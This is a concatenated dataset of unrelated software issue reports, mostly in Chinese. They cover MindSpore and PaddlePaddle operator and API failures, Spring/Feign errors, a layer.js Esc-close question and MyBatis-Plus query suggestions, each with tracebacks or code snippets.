main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'instanceOperatorClientImpl' defined in URL [jar:file:/D:/programSoftware/maven/repo/com/pig4cloud/nacos/nacos-naming/2.0.0.RELEASE/nacos-naming-2.0.0.RELEASE.jar!/com/alibaba/nacos/naming/core/InstanceOperatorClientImpl.class]: Unsatisfied dep"
推理过程中asnumpy出现错误SyncDeviceToHost failed.,"使用mindspore进行推理的时候，对一批按次序的视频图片做推理，会出现Tensor.asnumpy()报错RuntimeError: SyncDeviceToHost failed. 但并不是每一次都会出错，而且代码中多次用到了Tensor.asnumpy()，会报错的只有一个地方 / 硬件环境: GPU : -- MindSpore version :1.8.0.dev20220724 -- Python version : 3.7.12 -- OS platform and distribution :Linux Ubuntu 18.04 -- GCC/Compiler version : (/): /mode pynative 执行测试用例。 成功运行   <code>: # #homo estimation H_hm_comp = np.identity(3) for i in range(1): # iterate H_hm, homo_score, simi_score = self.homo_estimate(self.init_homo_tmp, homo_search_img, mask_tmp) homo_score = homo_score.asnumpy() H_hm = H_hm.squeeze(0).asnumpy() H_hm = np.linalg.inv(H_hm) H_hm = (1.0 / H_hm.item(8)) * H_hm homo_search_img = np.expand_dims(cv2.warpPerspective(homo_search_img[0], np.linalg.inv(H_hm), (127,127), borderMode=cv2.BORDER_REPLICATE), 0) H_hm_comp = H_hm_comp @ H_hm [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.682.965 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:167] SyncStream] cudaStreamSynchronize failed, ret[700], an illegal memory access was encountered [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.682.983 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_address.cc:63] SyncDeviceToHost] SyncStream failed [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.682.999 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:115] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.683.004 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:382] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.683.008 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:385] GetEvalStackInfo] Length of analysis information stack is empty. Traceback (most recent call last): File ""/home/lbyang/workspace/HDN_mindspore/tools/test.py"", line 251, in &lt;module&gt; main() File ""/home/lbyang/workspace/HDN_mindspore/tools/test.py"", line 152, in main outputs = tracker.track_new(idx, img, gt_bbox_, gt_poly, gt_points) File ""/home/lbyang/workspace/HDN_mindspore/hdn/tracker/hdn_tracker_proj_e2e.py"", line 254, in track_new homo_score = homo_score.asnumpy() File ""/home/lbyang/anaconda3/envs/hdn_mindspore/lib/python3.7/site-packages/mindspore/common/tensor.py"", line 536, in asnumpy return Tensor_.asnumpy(self) RuntimeError: SyncDeviceToHost failed. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/core/ir/tensor.cc:834 data_sync [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.687 [mindspore/ccsrc/pipeline/jit/init.cc:376] operator()] Start releasing dataset handles... [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.706 [mindspore/ccsrc/pipeline/jit/init.cc:379] operator()] End release dataset handles. [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.711 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1826] FinalizeCluster] Start finalize the cluster instance. [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.717 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1833] FinalizeCluster] End finalize the cluster instance. [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.722 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1672] ClearResAtexit] Pipeline clear all resource [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.861 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:167] SyncStream] cudaStreamSynchronize failed, ret[700], an illegal memory access was encountered [ERROR] ME(28722,7f79b241b740,python):2022-08-12-14:57:10.683.868 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:89] WaitTaskFinishOnDevice] SyncStream failed [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.683.874 [mindspore/ccsrc/pipeline/jit/pipeline.cc:225] RecordExitStatus] Status record: system exit. [INFO] ME(28722,7f79b241b740,python):2022-08-12-14:57:10.683.978 [mindspore/core/mindrt/src/actor/actormgr.cc:151] Finalize] mindrt Actors finish exiting. [INFO] ME(28722,7f79b241b740,python):2022-08-12-14:57:10.683.983 [mindspore/core/mindrt/src/actor/actormgr.cc:154] Finalize] mindrt Threads finish exiting. [INFO] ME(28722,7f79b241b740,python):2022-08-12-14:57:10.688.916 [mindspore/core/mindrt/src/actor/actormgr.cc:165] Finalize] mindrt IOMGRS finish exiting. [INFO] PIPELINE(28722,7f79b241b740,python):2022-08-12-14:57:10.688.931 [mindspore/ccsrc/pipeline/jit/pipeline.cc:1701] ClearResAtexit] Start clear device context... [INFO] ME(28722,7f79b241b740,python):2022-08-12-14:57:10.688.936 [mindspore/ccsrc/runtime/hardware/device_context_manager.cc:35] ClearDeviceContexts] Release device GPU_0 [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.688.963 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:158] DestroyStream] cudaStreamDestroy failed, ret[700], an illegal memory access was encountered [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.688.968 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:60] ReleaseDevice] Op Error: Failed to destroy CUDA stream. | Error Number: 0 [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.688.973 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:158] DestroyStream] cudaStreamDestroy failed, ret[700], an illegal memory access was encountered [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.688.976 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:60] ReleaseDevice] Op Error: Failed to destroy CUDA stream. | Error Number: 0 [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.689.094 [mindspore/ccsrc/plugin/device/gpu/hal/device/gpu_device_manager.cc:66] ReleaseDevice] cuDNN Error: Failed to destroy cuDNN handle | Error Number: 4 CUDNN_STATUS_INTERNAL_ERROR [INFO] PRE_ACT(28722,7f79b241b740,python):2022-08-12-14:57:10.689.539 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:464] operator()] Common mem pool info: Total allocated mem:1024M, peak used mem:115M, in used mem:4M, total idle mem:1019M. Block unit size:1024M, block counts:1, block[0] block size:1024M idle size:1019M [INFO] PRE_ACT(28722,7f79b241b740,python):2022-08-12-14:57:10.689.670 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:464] operator()] Persistent mem pool info: Total allocated mem:1024M, peak used mem:319M, in used mem:319M, total idle mem:704M. Block unit size:1024M, block counts:1, block[0] block size:1024M idle size:704M [INFO] PRE_ACT(28722,7f79b241b740,python):2022-08-12-14:57:10.689.677 [mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:474] DumpDynamicMemPoolStateInfo] The dynamic memory pool total allocated mem:2048M, peak used mem:435M, in used mem:323M, total idle mem:1724M. Weight used size:0M, constant value used size:0M, kernel output used size:0M, other used size:323M. [ERROR] DEVICE(28722,7f79b241b740,python):2022-08-12-14:57:10.689.685 [mindspore/ccsrc/plugin/device/gpu/hal/device/cuda_driver.cc:48] FreeDeviceMem] cudaFree failed, ret[700], an illegal memory access was encountered [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.689.728 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:115] TraceGraphEval] Length of analysis graph stack is empty. [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.689.733 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:382] GetEvalStackInfo] Get graph analysis information begin [INFO] DEBUG(28722,7f79b241b740,python):2022-08-12-14:57:10.689.737 [mindspore/ccsrc/pipeline/jit/debug/trace.cc:385] GetEvalStackInfo] Length of analysis information stack is empty. Error in atexit._run_exitfuncs: RuntimeError: Free device memory[0x7f7706000000] error. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/common/mem_reuse/mem_dynamic_allocator.cc:428 operator()"
[API] `nn.Layer.train`接口动静一致性问题,"测试版本： paddle-develop 测试代码: 测试输出： 预期结果： 正常返回，并且   <code>: import paddle as p p.enable_static() l=p.nn.Linear(3,3) l.train() Traceback (most recent call last): File ""&lt;stdin&gt;"", line 1, in &lt;module&gt; File ""/opt/conda/envs/py36/lib/python3.6/site-packages/paddle/fluid/dygraph/layers.py"", line 136, in train framework._dygraph_tracer().train_mode() AttributeError: 'NoneType' object has no attribute 'train_mode' l.training is True"
【ST】【MS】【OPS】MaxPool3DwithArgmax算子在mindspore 2.0master分支GPU后端用例执行dynamic_shape报错,"【ST】【MS】【OPS】MaxPool3DwithArgmax算子在mindspore 2.0master分支CPU后端用例执行dynamic_shape报错 / 硬件环境: /device GPU : -- MindSpore version : mindspore 2.0.0.20221031 commit_id = ''[sha1]:1b4a5ce3,[branch]:(HEAD,origin/master,origin/HEAD,master)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_argmax_type_int64_fp16 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_argmax_type_int32_fp32 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_argmax_type_int64_ceil_mode_true_fp64 test_ms_ops_maxpool3dwithargmax_func_input_input_1x2x3x3x4_argmax_type_int64_int8 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_argmax_type_int64_int16 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x8x9x7_argmax_type_int64_int32 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x16x32x16_argmax_type_int64_int64 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x16x32x16_argmax_type_int64_uint8 test_ms_ops_maxpool3dwithargmax_func_input_input_1x2x16x32x16_argmax_type_int64_uint16 test_ms_ops_maxpool3dwithargmax_func_input_input_1x2x16x32x16_argmax_type_int64_uint32 test_ms_ops_maxpool3dwithargmax_func_input_input_1x2x16x32x16_argmax_type_int64_uint64 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_dilation_int_fp32 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_dilation_3ele_tuple_fp32 test_ms_ops_maxpool3dwithargmax_func_input_input_5x4x3x4x3_dilation_5ele_tuple_fp32 export ME_DYNAMIC_SHAPE=1 export DEVICE_TYPE=GPU_PCIE pytest -s test_ms_ops_maxpool3dwithargmax_func.py 用例执行通过 ` self.ms_log.step(""Step1: Start operator accuracy compare."") test_ms_ops_maxpool3dwithargmax_func.py:325: ../../../../common/ms_aw/operator/nn/maxpool3dwithargmax_ops.py:136: in forward_cmp out_mindspore = self.forward_mindspore_impl() ../../../../common/ms_aw/operator/nn/maxpool3dwithargmax_ops.py:93: in forward_mindspore_impl out = net(input_me) ../../../../common/utils/operator_helper.py:319: in call self.run_dynamic_shape(*args, **kwargs) ../../../../common/utils/operator_helper.py:279: in run_dynamic_shape self.compare_static_input_and_dynamic_input(out, out_dyn) ../../../../common/utils/operator_helper.py:343: in compare_static_input_and_dynamic_input allclose_nparray(out[i].asnumpy(), out_dyn[i].asnumpy(), 0, 0) ../../../../common/utils/operator_helper.py:182: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) ` 梁成辉   <code>: assert fact.forward_cmp()"
layer关闭弹层的问题,layer没有关闭的快捷键。 自己动手加了一个按Esc关闭弹层的事件，预想每按一次Esc关闭最新停留在界面上的弹层。 存在的问题：如果存在多个弹层，按Esc只能关闭之前最后打开的那个弹层，但layer.index获取到的层索引不会排除已经关掉的弹层！   <code>: layer.close(layer.index); //它获取的始终是最新弹出的某个层，值是由layer内部动态递增计算的
[MS][NET][ncf/centerface][ascend]network train failed,": /device ascend : -- MindSpore version :commit_id:73ac0da5916 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C79/20210813 test_ms_modle_zoo_ncf_train_infer.py test_ms_centerface_perf.py test_ms_centerface_check_loss_8p.py get code from model_zoo start train network train failed network train success ncf/centerface网络在ascend910环境训练失败   <code>: Traceback (most recent call last): File ""./train.py"", line 98, in &lt;module&gt; run_train() File ""/home/jenkins/workspace/TDT_deployment/solution_test/remaining/test_scripts/mindspore/net/ncf/test_ms_model_zoo_ncf_train_infer/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""./train.py"", line 94, in run_train dataset_sink_mode=True) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 656, in train sink_size=sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 445, in _train self._train_dataset_sink_process(epoch, train_dataset, list_callback, cb_params, sink_size) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 505, in _train_dataset_sink_process outputs = self._train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 384, in __call__ out = self.compile_and_run(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 647, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 634, in compile _executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 536, in compile result = self._executor.compile(obj, args_list, phase, use_vm, self.queue_name) RuntimeError: mindspore/ccsrc/backend/optimizer/ascend/format_type/check_consistency.cc:85 Process] Found inconsistent format or data type! Op: Adam[kernel_graph_1:[CNode]228{[0]: ValueNode&lt;Primitive&gt; Adam, [1]: logits_dense.weight, [2]: moment1.logits_dense.weight, [3]: moment2.logits_dense.weight, [4]: [CNode]229, [5]: [CNode]229, [6]: [CNode]230, [7]: ValueNode&lt;Tensor&gt; Tensor(shape=[], dtype=Float32, value= 0.9), [8]: ValueNode&lt;Tensor&gt; Tensor(shape=[], dtype=Float32, value= 0.999), [9]: ValueNode&lt;Tensor&gt; Tensor(shape=[], dtype=Float32, value= 1e-08), [10]: [CNode]231, [11]: [CNode]241}] # In file /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/optim/adam.py(164) success = F.depend(success, opt(param, moment1, moment2, beta1_power, beta2_power, lr, beta1, beta2,"
[ST][MS][ops][applyadamax][vmap]RuntimeError: Launch kernel failed: VampRule/Default/vmap_ApplyAdaMax/ApplyAdaMax-op33,"applyadamax算子在cpu-x86环境启动vmap功能失败 / 硬件环境: /device CPU_X86+Ubuntu : -- MindSpore version :r2.0 commit_id:cd15cccd -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221028163549 r2.0 commit_id:cd15cccd (/): /mode graph test_ms_ops_applyadamax_vmap.py cd solution_test/cases/04operator/16training/applyadamax pytest -s test_ms_ops_applyadamax_vmap.py applyadamax算子vmap功能正常 走给冯一航   <code>: Test_ms_ops_applyadamax_vmap.test_ms_ops_applyadamax_vmap_vmap ________ self = &lt;test_ms_ops_applyadamax_vmap.Test_ms_ops_applyadamax_vmap object at 0x7fca083cdf50&gt; @pytest.mark.timeout(300) @pytest.mark.Function @pytest.mark.level0 def test_ms_ops_applyadamax_vmap_vmap(self): """""" TestCase_Name:Applyadamax算子vmap功能测试, Fapplyadamax_vmap TestCase_executeParam:env_Ascend,env_Cpu; TestCase_customField1:Ops_Case,Pynative_Case;TestCase_stage:Iota """""" assert self.init_success_flg self.ms_log.info(""Applyadamax operator test, Fapplyadamax_vmap"") var = Parameter(Tensor(np.random.rand(3, 4, 2, 2).astype(np.float16)), name=""var"") m = Parameter(Tensor(np.random.rand(3, 4, 2, 2).astype(np.float16)), name=""m"") v = Parameter(Tensor(np.random.rand(3, 4, 2, 2).astype(np.float16)), name=""v"") grad = Tensor(np.random.randn(3, 4, 2, 2).astype(np.float16)) beta1_power = Tensor(np.array([[0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1]], dtype=np.float16)) lr = Tensor(np.array([[0.001, 0.001, 0.001, 0.001], [0.001, 0.001, 0.001, 0.001], [0.001, 0.001, 0.001, 0.001]], dtype=np.float16)) beta1 = Tensor(np.array([[0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1]], dtype=np.float16)) beta2 = Tensor(np.array([[0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1], [0.1, 0.1, 0.1, 0.1]], dtype=np.float16)) epsilon = Tensor( np.array([[0.001, 0.001, 0.001, 0.001], [0.001, 0.001, 0.001, 0.001], [0.001, 0.001, 0.001, 0.001]], dtype=np.float16)) fact = ApplyAdaMaxMock( inputs=[var, m, v, beta1_power, lr, beta1, beta2, epsilon, grad], nest_axis_size=3) net = ApplyAdaMaxVMap() &gt; fact.self_define_vamp_cmp(net=net, run_time=20, improve_times=1.1) test_ms_ops_applyadamax_vmap.py:84: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../../../../common/ms_aw/operator/training/applyadamax_ops.py:307: in self_define_vamp_cmp self.epsilon, self.grad) ../../../../common/ms_aw/operator/training/applyadamax_ops.py:342: in vmap_cmp nest_output = nest_net_vmap(*inputs) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:615: in __call__ out = self.compile_and_run(*args) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py:937: in compile_and_run return _cell_graph_executor(self, *new_inputs, phase=self.phase) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:1419: in __call__ return self.run(obj, *args, phase=phase) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:1456: in run return self._exec_pip(obj, *args, phase=phase_real) /home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py:96: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fca9aa335d0&gt; obj = NestNetVmap&lt; (net): ApplyAdaMaxVMap&lt;&gt; &gt; phase = 'train.1667232379209500160.140511212788816.0' args = (Tensor(shape=[3, 4], dtype=Float16, value= [[ 9.9976e-02, 9.9976e-02, 9.9976e-02, 9.9976e-02], [ 9.9976e-02, 9.9...84e-01, -2.1411e-01], [-6.3721e-01, 2.2012e+00]], [[-1.9756e+00, -6.4404e-01], [ 6.0840e-01, 4.4580e-01]]]])) fn = &lt;bound method ApplyAdaMaxMock.nest_net_vmap.&lt;locals&gt;.NestNetVmap.construct of NestNetVmap&lt; (net): ApplyAdaMaxVMap&lt;&gt; &gt;&gt; @_wrap_func def _exec_pip(self, obj, *args, phase=''): """"""Execute the generated pipeline."""""" fn = obj.construct obj.__parse_method__ = fn.__name__ &gt; return self._graph_executor(args, phase) E RuntimeError: Launch kernel failed: VmapRule/Default/vmap_ApplyAdaMax/ApplyAdaMax-op33 E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/runtime/graph_scheduler/graph_scheduler.cc:634 Run"
图像分类中如何定义符合网络的优化方法？,"这对图像分类来说，如何定义一个符合该模型的优化方法呢？依据是什么？比如下面的models中图像分类的优化方法，它们的依据是什么？ https://github.com/PaddlePaddle/models/blob/62148b786dfc1adc6c32b3ab4b1807edc1b259a1/fluid/PaddleCV/image_classification/train.py#L54-L120   <code>: def optimizer_setting(params): ls = params[""learning_strategy""] if ls[""name""] == ""piecewise_decay"": if ""total_images"" not in params: total_images = 1281167 else: total_images = params[""total_images""] batch_size = ls[""batch_size""] step = int(total_images / batch_size + 1) bd = [step * e for e in ls[""epochs""]] base_lr = params[""lr""] lr = [] lr = [base_lr * (0.1**i) for i in range(len(bd) + 1)] optimizer = fluid.optimizer.Momentum( learning_rate=fluid.layers.piecewise_decay( boundaries=bd, values=lr), momentum=0.9, regularization=fluid.regularizer.L2Decay(1e-4)) elif ls[""name""] == ""cosine_decay"": if ""total_images"" not in params: total_images = 1281167 else: total_images = params[""total_images""] batch_size = ls[""batch_size""] step = int(total_images / batch_size + 1) lr = params[""lr""] num_epochs = params[""num_epochs""] optimizer = fluid.optimizer.Momentum( learning_rate=cosine_decay( learning_rate=lr, step_each_epoch=step, epochs=num_epochs), momentum=0.9, regularization=fluid.regularizer.L2Decay(4e-5)) elif ls[""name""] == ""exponential_decay"": if ""total_images"" not in params: total_images = 1281167 else: total_images = params[""total_images""] batch_size = ls[""batch_size""] step = int(total_images / batch_size +1) lr = params[""lr""] num_epochs = params[""num_epochs""] learning_decay_rate_factor=ls[""learning_decay_rate_factor""] num_epochs_per_decay = ls[""num_epochs_per_decay""] NUM_GPUS = 1 optimizer = fluid.optimizer.Momentum( learning_rate=fluid.layers.exponential_decay( learning_rate = lr * NUM_GPUS, decay_steps = step * num_epochs_per_decay / NUM_GPUS, decay_rate = learning_decay_rate_factor), momentum=0.9, regularization = fluid.regularizer.L2Decay(4e-5)) else: lr = params[""lr""] optimizer = fluid.optimizer.Momentum( learning_rate=lr, momentum=0.9, regularization=fluid.regularizer.L2Decay(1e-4)) return optimizer"
是否可以提供更优雅的通用查询方式？,"针对单表的操作，更多的时候都是通过其外键的字段进行查询数据，MP虽然也提供了该场景的查询方式，但个人感觉以下的方式更加优雅，所以想问问，MP是否能考虑以下的查询方式，如： 其传入的参数，没有任何多余的代码，不需要手动显示new出该对象，也不需要引用一个其他的类来作为参数包装，显得更优雅   <code>: 根据用户ID查询：User user = userMapper.selectOne(User::getUserId, userId); 根据用户名查询：User user = userMapper.selectOne(User::getUserName, userName); 根据账号ID查询：User user = userMapper.selectOne(User::getAccountId, accoutId); ...."
[CT][MS][SegmentMin] SegmentMin has AssertionError at the model of graph on gpu,"在 GPU 后台 graph模式下 运行test_segmentmin_input_dtype_int64_4d 会出现偶现的精度问题 ，pynative 模式无问题 def test_segmentmin_input_dtype_int64_4d(): input_list = [] x0 = Tensor(np.random.randn(3, 58, 11, 35).astype(np.int64)) input_list.append(x0) x1 = Tensor(np.sort(np.random.randint(x0.shape[0], size=x0.shape[0])).astype(np.int32)) input_list.append(x1) fact = SegmentMinMock(inputs=input_list) test_segmentmin_input_dtype_float16_4d   <code>: fact.forward_cmp()"
Documentation about how to write documentation.,Write a documentation to show: How paddle docs are organized. How to write How to build and How does update documentation.   <code>: paddle docs paddle docs preview documentation locally www.paddlepaddle.org
调用userService.save()方法保存用户信息无效,"调用userService.save()方法保存用户信息无效,没有错误信息,数据库没有数据,没有INSTALL SQL日志打印 没有错误，js_sys_user表里没有数据。。   <code>: @org.junit.Test public void save(){ EmpUser user = new EmpUser(); user.setLoginCode(""456897465""); user.setUserName(""4561246984""); // 1、初始化用户信息 if (user.getIsNewRecord()){ userService.genId(user, user.getLoginCode()); user.setUserCode(user.getUserCode()+""_""+ IdGen.randomBase62(4).toLowerCase()); user.setUserType(EmpUser.USER_TYPE_EMPLOYEE); user.setMgrType(EmpUser.MGR_TYPE_NOT_ADMIN); } Employee employee = user.getEmployee(); // 如果员工编码为空，则使用用户编码 if (StringUtils.isBlank(employee.getEmpCode())){ employee.setEmpCode(user.getUserCode()); } // 如果员工姓名为空，则使用昵称名 if (StringUtils.isBlank(employee.getEmpName())){ employee.setEmpName(user.getUserName()); } // 2、保存用户 user.setRefCode(employee.getEmpCode()); user.setRefName(employee.getEmpName()); userService.save(user); System.out.println(""12465""); }"
paddle fluid 1.2 nce和paddle v2版本的nce计算loss上有什么区别吗，同样的网络结构，loss差别很大,"v2版本的nce使用 self.nce_layer = paddle.layer.nce( input=self.norm_fc_2, label=self._label_layer, num_classes=label_dim, param_attr=paddle.attr.Param(name='nce_w', initial_mean=0.0, initial_std=1.0), bias_attr=paddle.attr.Param(name='nce_b', initial_mean=0.0, initial_std=1.0), num_neg_samples=self._num_neg_samples, neg_distribution=self._label_freq ) fluid版本的nce使用 w_param = fluid.default_main_program().global_block().create_parameter(shape=[label_dim, hidden2_dim], dtype='float32', name='nce_w', default_initializer=fluid.initializer.Normal()) b_param = fluid.default_main_program().global_block().create_parameter(shape=[label_dim, 1], dtype='float32', name='nce_b', default_initializer=fluid.initializer.Normal()) 另外实际使用时，当网络结构数据一样的情况下发现fluid训练比v2慢3倍左右   <code>: # 配置NCE层 if not self._is_infer: self.nce_layer = fluid.layers.nce( input=self.norm_fc_2, sampler='custom_dist', custom_dist=self._dist, label=self._label_layer, num_total_classes=label_dim, param_attr=fluid.ParamAttr(name='nce_w'), bias_attr=fluid.ParamAttr(name='nce_b'), num_neg_samples=self._num_neg_samples )"
调用FeignClient里的方法，如果data为空时报错,"pigx版本: 3.4 是否修改包名: 否 功能：实现业务系统的用户登录功能 问题：如果用户表（sys_member）中存在用户手机号，则可以登录成功。如果不存在此用户手机号，则会报错：RemoteMemberService#info(String,String) failed and fallback failed. 疑问：如果将null改为""new SysMember()""则不会报错,接口调用返回信息“用户名不存在或密码错误”。为什么UserController.java里返回null也可以？自定义的却不行？ 详细回显步骤 1.用postman调用接口：http://localhost:9999/auth/oauth/token ，参数username为“PWD@18888888888”； 2.单步调试调用到PigxUserDetailsServiceImpl.java里loadUserByUsername方法的如下代码时报错： 详细报错信息如下： 3.其中RemoteMemberService.java、MemberController.java的定义如下代码和图片所示:   <code>: public R&lt;SysMember&gt; info(@PathVariable(""phone"") String phone) { SysMember member = sysMemberService.getByPhone(phone); if (member == null) return R.failed(new SysMember(), ""没有找到用户""); return R.ok(member); } R&lt;SysMember&gt; result = remoteMemberService.info(strUsername, SecurityConstants.FROM_IN); 2020-02-13 14:01:55.895 ERROR 992 --- [ XNIO-1 task-5] o.s.s.o.provider.endpoint.TokenEndpoint : Handling error: InternalAuthenticationServiceException, RemoteMemberService#info(String,String) failed and fallback failed. org.springframework.security.authentication.InternalAuthenticationServiceException: RemoteMemberService#info(String,String) failed and fallback failed. Caused by: org.springframework.web.client.RestClientException: Error while extracting response for type [com.pig4cloud.pigx.common.core.util.R&lt;com.pig4cloud.pigx.demo.entity.SysMember&gt;] and content type [application/json;charset=UTF-8]; nested exception is org.springframework.http.converter.HttpMessageNotReadableException: JSON parse error: Cannot construct instance of `com.pig4cloud.pigx.demo.entity.SysMember` (although at least one Creator exists): no String-argument constructor/factory method to deserialize from String value (''); nested exception is com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot construct instance of `com.pig4cloud.pigx.demo.entity.SysMember` (although at least one Creator exists): no String-argument constructor/factory method to deserialize from String value ('') ...... Caused by: com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot construct instance of `com.pig4cloud.pigx.demo.entity.SysMember` (although at least one Creator exists): no String-argument constructor/factory method to deserialize from String value ('') public interface RemoteMemberService { @GetMapping({""/member/info/{phone}""}) R&lt;SysMember&gt; info(@PathVariable(""phone"") String var1, @RequestHeader(""from"") String var2); }"
多余依赖引入问题：spring-actuator,JDK版本: 1.8 SpringBoot版本: 2.x 本程序版本: 2.5.7 添加maven依赖，配置对应数据库后，启动。 启动失败，查询日志。 根据源码：DynamicDataSourceProperties.java 查询，healthCheck在以下代码使用：MasterSlaveAutoRoutingPlugin.java 继续查找： 所以这里使用了spring-actuator的包，但是项目中没有引入依赖，所以造成了相关问题。 期望值: 不要引入过多其他包 实际值: 默认关闭的一个功能，要求引入一个用不上的包 重现步骤 嗯，我觉得应该可以不用写太多。   <code>: Caused by: java.lang.NoClassDefFoundError: org/springframework/boot/actuate/health/AbstractHealthIndicator /** * 是否使用 spring actuator 监控检查，默认不检查 */ private boolean health = false; /** * 获取动态数据源名称，重写注入 DbHealthIndicator 支持数据源健康状况判断选择 * * @param mappedStatement mybatis MappedStatement */ public String getDataSource(MappedStatement mappedStatement) { String slave = DdConstants.SLAVE; if (properties.isHealth()) { /* * 根据从库健康状况，判断是否切到主库 */ boolean health = DbHealthIndicator.getDbHealth(DdConstants.SLAVE); if (!health) { health = DbHealthIndicator.getDbHealth(DdConstants.MASTER); if (health) { slave = DdConstants.MASTER; } } } return SqlCommandType.SELECT == mappedStatement.getSqlCommandType() ? slave : DdConstants.MASTER; } public class DbHealthIndicator extends AbstractHealthIndicator { ... }
